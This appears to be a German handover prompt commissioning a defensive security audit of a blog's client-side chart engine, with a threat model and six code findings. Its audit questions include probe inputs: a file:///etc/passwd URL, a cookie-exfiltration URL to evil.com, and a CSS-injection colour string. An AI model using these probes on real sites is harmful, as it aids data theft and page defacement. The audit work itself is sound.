# Übergabeprompt: Sicherheitsaudit der Finanzwesir Chart Engine
Stand: 2026-05-03 08:02 | Session: A7-Stand-Datum | Geändert von: Claude

## Ihre Rolle

Sie sind ein Application-Security-Spezialist, der zu den besten 0,1 % seines
Faches gehört. Ihr Spezialgebiet: Client-Side JavaScript Security für
Content-Websites — XSS-Prävention, Input-Validierung, sichere DOM-Manipulation,
Prototype Pollution, Supply-Chain-Risiken.

Sie sind KEIN Pentester, der Infrastruktur angreift. Sie sind KEIN
Compliance-Auditor, der Checklisten abhakt. Sie sind ein Code-Reviewer,
der JavaScript liest und versteht.

## KI Spitzenleistung — Methodische Pflichten

Recherchieren Sie gründlich und nutzen Sie mindestens 2 unabhängige Quellen
pro Bewertung. Benennen Sie diese Quellen explizit.

Wenden Sie für JEDE Bewertung diese vier Methoden an:

1. **Mainstream-Analyse:** Was sagen die etablierten Security-Referenzen
   (OWASP Top 10, OWASP DOM-Based XSS Cheat Sheet, Mozilla Web Security
   Guidelines, Google's Trusted Types)?
2. **Via Negativa / Munger-Inversion ("Invert, always invert"):**
   Statt "Was sollten wir hinzufügen?" fragen Sie: "Was sollten wir
   WEGLASSEN oder VERMEIDEN?" Welche Sicherheitsmaßnahmen machen den Code
   KOMPLEXER ohne echten Schutz? Welche "Best Practices" sind für diesen
   konkreten Fall irrelevant oder kontraproduktiv? Die beste Sicherheit
   ist oft weniger Angriffsfläche, nicht mehr Verteidigungsschichten.
3. **Ockhams Rasiermesser:** Wenn zwei Lösungen das gleiche Risiko
   adressieren, ist die einfachere immer vorzuziehen. Eine 50-Zeilen
   Sanitizer-Bibliothek für einen Fall, den `textContent` löst, braucht
   eine höhere Beweislast.
4. **Devil's Advocate:** Argumentieren Sie aktiv gegen jede eigene
   Bewertung. Warum könnte ein Finding KEIN echtes Risiko sein?
   Unter welchen Umständen wäre ein Fix kontraproduktiv?

Präsentieren Sie alle Bewertungen neutral und ohne kognitiven Bias.

---

## Kontext: Was ist die Finanzwesir Chart Engine?

Eine Client-Side BI-Engine für einen deutschen Finanzblog.
Drei Chart-Typen: Line (Zeitreihe), Bar (Jahresperformance), Pie/Donut
(Allokation). Pro Blog-Seite maximal 3 Charts.

### Bedrohungsmodell (Threat Model)

Bevor Sie Code lesen, verstehen Sie das Bedrohungsmodell:

**Wer sind die Akteure?**
- **Blog-Leser:** Konsumiert die Seite passiv. Hat KEINE Eingabemöglichkeit
  in die Chart Engine. Keine Formulare, keine URL-Parameter, keine Query-Strings.
- **Blog-Betreiber / Redakteur:** Schreibt Artikel im Ghost CMS. Fügt
  HTML-Cards mit `<div>`-Containern und `data-*`-Attributen ein. Das ist
  die EINZIGE Schnittstelle zur Engine.
- **Angreifer mit CMS-Zugang:** Wenn jemand Zugang zum Ghost-Editor hat,
  kann er beliebiges HTML in die Seite injizieren — auch ohne Chart Engine.
  Die Engine ist dann nicht der Angriffsvektor, sondern das CMS.

**Was ist die Angriffsfläche?**
- `data-csv`: URL zu einer CSV-Datei → wird an `fetch()` übergeben
- `data-type`: Chart-Typ → wird als Lookup-Key in einem Objekt verwendet
- `data-title`: Überschrift → wird ins DOM geschrieben
- `data-colors`: Farb-Mapping → wird als CSS-Wert verwendet
- `data-options`: Konfigurationsstring → wird geparst
- CSV-Inhalt: Vom Server geladene Daten → werden geparst und an Chart.js übergeben

**Was ist NICHT die Angriffsfläche?**
- Keine URL-Parameter / Query-Strings
- Keine Formulare
- Keine LocalStorage/SessionStorage-Nutzung
- Keine Cookies
- Keine WebSocket-Verbindungen
- Keine postMessage-Listener
- Kein dynamischer Code-Import

### Architektur (5-Layer-Modell)

| Layer | Name | Dateien | Sicherheitsrelevanz |
|-------|------|---------|-------------------|
| 1 | The Vault (Daten) | CSVParser.js, FinanzwesirData.js | Parst externe Daten, Deep Freeze |
| 2 | The Manager (Orchestration) | ChartEngine.js | Liest `data-*`-Attribute, steuert Ablauf |
| 3 | The Brains (Strategien) | Base/Line/Bar/PieChartStrategy.js | Transformiert Daten, erstellt fwContext |
| 4 | The Curator (Mathematik) | FwSmartScales, FwDateUtils, etc. | Reine Berechnung, keine I/O |
| 5 | The Face (UI) | FwRenderer, FwTheme, FwFormatUtils, etc. | DOM-Manipulation, CSS-Injection |

### Dateiverzeichnis

Alle relevanten Dateien liegen in `assets/js/fw-chart-engine/`:

```
assets/js/fw-chart-engine/
├── index.js                          (Entry Point, 7 Zeilen)
├── core/
│   ├── ChartEngine.js                (Orchestrator, liest data-* Attribute)
│   ├── FwRenderer.js                 (DOM-Manipulation, innerHTML, CSS-Injection)
│   ├── FwTheme.js                    (Farben, Fonts — statische Werte)
│   ├── FwSmartScales.js              (Skalen-Orchestrierung)
│   ├── FwSmartXAxis.js               (X-Achsen-Logik)
│   ├── FwSmartYAxis.js               (Y-Achsen-Logik)
│   ├── FwChartPlugins.js             (Chart.js Plugin-Registrierung)
│   ├── FwDateAdapter.js              (Datum-Adapter für Chart.js)
│   ├── FwDateUtils.js                (Datums-Berechnungen)
│   ├── FwFormatUtils.js              (Zahlenformatierung)
│   ├── FwLayoutRules.js              (Responsive Layout)
│   ├── FwSmartTooltips.js            (Tooltip-Formatierung)
├── data/
│   ├── CSVParser.js                  (fetch + CSV-Parsing)
│   └── FinanzwesirData.js            (Immutable Data Store, Deep Freeze)
├── strategies/
│   ├── BaseChartStrategy.js          (Basis-Klasse, fwContext-Erstellung)
│   ├── LineChartStrategy.js          (Linien-Chart Konfiguration)
│   ├── BarChartStrategy.js           (Balken-Chart Konfiguration)
│   └── PieChartStrategy.js           (Torten-Chart Konfiguration)
```

**Gesamt:** 17 JavaScript-Dateien, ~3.500 Zeilen Code.

---

## Vorab-Scan: Bekannte Befunde (Ausgangspunkt für Ihre Analyse)

Ein automatisierter Scan hat folgende Befunde ergeben. Ihre Aufgabe ist es,
diese zu **verifizieren, bewerten, und priorisieren** — nicht blind zu
übernehmen.

### Befund 1: `fetch()` ohne URL-Validierung (CSVParser.js)

```javascript
// CSVParser.js, Zeile 51
const response = await fetch(url, { priority: 'high' });
```

Die URL kommt aus `container.dataset.csv` (ChartEngine.js, Zeile 84).
Keine Protokoll-Prüfung, keine Origin-Prüfung.

**Fragen an Sie:**
- Ist das ein reales Risiko, wenn nur der CMS-Redakteur die URL kontrolliert?
- Was passiert, wenn jemand `data-csv="file:///etc/passwd"` eingibt?
- Was passiert bei `data-csv="https://evil.com/steal?cookie=..."` (kein Cookie-Zugang, aber Exfiltration)?
- Ist eine Protokoll-Whitelist (`https://` only) sinnvoll oder Security Theater?

### Befund 2: `innerHTML` mit Sanitization (FwRenderer.js)

```javascript
// FwRenderer.js, Zeile 31 — Fehlermeldung
container.innerHTML = `<div style="color:${c.purpur}...">❌ Fehler: ${this._sanitize(message)}</div>`;

// FwRenderer.js, Zeilen 422-426 — Sanitizer
_sanitize(str) {
    if (!str) return '';
    if (typeof str !== 'string') return String(str);
    return str.replace(/[<>]/g, '');
}
```

Der Sanitizer entfernt `<` und `>`, aber nicht Anführungszeichen oder
Event-Handler-Attribute.

**Fragen an Sie:**
- Ist das ein reales XSS-Risiko? Der sanitisierte String landet innerhalb
  eines `<div>`-Text-Knotens, nicht in einem Attribut.
- Wäre `textContent` statt `innerHTML` hier die sicherere Alternative?
- Oder wäre das Over-Engineering, weil die `message` aus einem `Error`-Objekt
  kommt (nicht direkt vom User)?

### Befund 3: Farb-Parsing ohne Validierung (ChartEngine.js)

```javascript
// ChartEngine.js, Zeilen 271-280
var parts = colorString.split(',');
for (var i = 0; i < parts.length; i++) {
    var pieces = parts[i].split(':');
    if (pieces.length === 2) {
        colors[pieces[0].trim()] = pieces[1].trim();  // Keine Validierung!
    }
}
```

Der Farbwert aus `data-colors` wird ohne Validierung als CSS-Wert verwendet.

**Fragen an Sie:**
- Kann ein bösartiger Farbwert CSS-Injection auslösen?
- Was passiert bei `data-colors="ETF: red; } body { display:none; } .x {"`?
- Wie verarbeitet Chart.js ungültige Farbwerte?
- Ist eine Regex-Validierung nötig oder löst Chart.js das Problem bereits?

### Befund 4: Options-Parsing ohne Whitelist (ChartEngine.js)

```javascript
// ChartEngine.js, Zeilen 261-266
_extractOption(optionsStr, key) {
    if (!optionsStr) return null;
    var idx = optionsStr.indexOf(key + ':');
    if (idx === -1) return null;
    var val = optionsStr.substring(idx + key.length + 1).split(',')[0].trim();
    return val;
}
```

Werte aus `data-options` werden ohne Whitelist-Prüfung extrahiert.

**Fragen an Sie:**
- Welche Werte werden erwartet? (range: `1y`, `3y`, `5y`, `10y`, `max`;
  view: `ranking`; benchmark: ETF-Name)
- Was passiert bei unerwarteten Werten? Crash, stille Fehlbehandlung, oder Sicherheitsproblem?
- Ist eine Allow-List sinnvoll oder unnötige Rigidität?

### Befund 5: Error-Messages leaken URLs (CSVParser.js)

```javascript
// CSVParser.js, Zeile 57
throw new Error(`CSV Load Error (${url}): ${err.message}`);
```

Die vollständige Fetch-URL erscheint in der Fehlermeldung, die über
`FwRenderer.showError()` im DOM angezeigt wird.

**Fragen an Sie:**
- Ist URL-Exposure in einer Fehlermeldung ein reales Risiko auf einem
  Blog, wo die URL ohnehin im HTML-Quelltext steht (`data-csv="..."`)?
- Für wen wäre diese Information nützlich (Angreifer? Debugging?)?

### Befund 6: Positive Befunde (was GUT ist)

Der Scan hat auch Stärken identifiziert:
- **Kein `eval()`, `Function()`, `setTimeout(string)`** — Zero dynamic code execution
- **Deep Freeze** auf allen Datenobjekten (FinanzwesirData.js) — Immutability enforced
- **`innerText`** statt `innerHTML` für Titel und Labels — XSS-immune
- **`textContent`** für Datenausgabe — XSS-immune
- **`document.createElement()`** statt HTML-String-Konkatenation — sicheres Pattern
- **Keine `eval`-artigen Patterns** in Template-Literalen
- **Einfache Regex-Patterns** ohne ReDoS-Risiko
- **Minimaler Global State** (nur `window.FinanzwesirChartEngine`)

---

## Ihre Aufgabe

### 1. Threat-Model-Validierung

Validieren Sie das oben beschriebene Bedrohungsmodell.
- Stimmt es, dass der Blog-Leser KEINE Eingabemöglichkeit hat?
- Gibt es versteckte Eingabekanäle, die der Vorab-Scan übersehen hat?
- Ist "Angreifer braucht CMS-Zugang" eine gültige Sicherheitsannahme?

### 2. Befund-Verifizierung und -Bewertung

Verifizieren Sie jeden der 6 Befunde. Für jeden Befund:
- **Ist der Befund korrekt?** (Stimmt der Code-Kontext?)
- **Ist es ein reales Risiko?** (Gegeben das Bedrohungsmodell)
- **Wie hoch ist die Severity?** (Critical / High / Medium / Low / Informational)
- **Was ist der realistische Angriffsvektor?**
- **Was ist die minimale, korrekte Gegenmaßnahme?** (Occam's Razor)

### 3. Eigene Findings

Suchen Sie nach Sicherheitsproblemen, die der Vorab-Scan ÜBERSEHEN hat:
- **Prototype Pollution:** Gibt es `Object.assign()`, Spread-Operator
  oder Property-Zugriffe mit unkontrollierten Keys?
- **DOM Clobbering:** Gibt es HTML-IDs, die globale Variablen überschreiben könnten?
- **Supply Chain:** Chart.js wird lokal gehostet (`assets/js/vendor/chart.umd.min.js`).
  SRI ist daher nicht nötig. Die HTML-Testdateien im Repo-Root nutzen noch
  CDN-URLs, werden aber beim Theme-Bau durch `default.hbs` ersetzt.
- **Timing Side Channels:** Gibt es Operationen, deren Dauer Informationen leakt?
- **Memory Leaks:** Werden Chart-Instanzen korrekt aufgeräumt (destroy)?
- **Event-Listener-Hygiene:** Werden Listener bei Re-Renders entfernt?
- **Content Security Policy (CSP):** Ist die Engine CSP-kompatibel?
  (Inline-Styles via `_injectStyles()`, Inline-Event-Handler?)

### 4. Architektur-Bewertung

Bewerten Sie die Sicherheitsarchitektur als Ganzes:
- Ist das 5-Layer-Modell sicherheitstechnisch sinnvoll?
- Ist der Datenfluss (HTML → data-* → fetch → parse → transform → render)
  sicher designed?
- Gibt es Layer-Verletzungen, die Sicherheitsprobleme verursachen könnten?
- Wie gut ist das "Gatekeeper Pattern" (Layer 1) umgesetzt?

### 5. Priorisierte Empfehlungen

Für jede Empfehlung die vier Methoden anwenden:
- **Mainstream:** Was sagt OWASP / Mozilla / Google dazu?
- **Via Negativa:** Warum sollten wir es vielleicht NICHT tun?
- **Occam's Razor:** Ist das die einfachste Lösung?
- **Devil's Advocate:** Was spricht dagegen?
- **Verdict:** Ihre finale Einschätzung mit Begründung
- **Aufwand:** Quick Win / Klein / Mittel / Groß

### 6. Anti-Empfehlungen

Welche Sicherheitsmaßnahmen werden häufig empfohlen, wären hier aber
kontraproduktiv? Denken Sie an:
- DOMPurify für 3.500 Zeilen Code?
- Content Security Policy für eine Engine, die CSS inline injiziert?
- Input-Sanitization-Library für Daten, die vom eigenen Server kommen?
- CSRF-Tokens für reine GET-Requests (fetch von CSV)?
- Rate Limiting für clientseitigen Code?

---

## Constraints

- **Scope: NUR `assets/js/fw-chart-engine/`**. Keine Ghost-Analyse,
  keine Server-Konfiguration, keine Infrastruktur.
- **Kein Code schreiben.** Nur analysieren und empfehlen. Code-Beispiele
  für Fixes sind erlaubt (als Illustration), aber keine fertigen Patches.
- **Zielgruppe ist kein Entwickler.** Erklären Sie alles in einfachen Worten.
  "XSS" muss erklärt werden. "Prototype Pollution" muss erklärt werden.
- **Die Architektur (5 Layer) steht.** Keine Empfehlung, die das
  Layer-Modell grundlegend ändert.
- **Enterprise-Qualität, nicht Paranoia.** Der Goldstandard im Repo ist
  `CSVParser.js` + `FinanzwesirData.js` (Defensive Coding, Deep Freeze,
  Allow-List, Gatekeeper-Pattern, actionable Errors, minimale Oberfläche).
  Empfehlungen sollten diesen Standard halten, nicht übertreffen.

## Ergebnisformat

Schreiben Sie die Analyse als strukturiertes Dokument mit:
1. Executive Summary (5 Sätze für den Blog-Betreiber)
2. Threat Model (validiert oder korrigiert)
3. Befund-Tabelle (Severity, Risiko, Empfehlung)
4. Eigene Findings (was der Vorab-Scan übersehen hat)
5. Architektur-Bewertung
6. Priorisierte Empfehlungstabelle (Quick Wins zuerst)
7. Anti-Empfehlungstabelle
8. Abschließend ein KOCHBUCH (wie in der Performance-Analyse): Was tun,
   was nicht tun, was optional — als klare Anweisungsliste für ein LLM,
   das die Fixes später umsetzt.
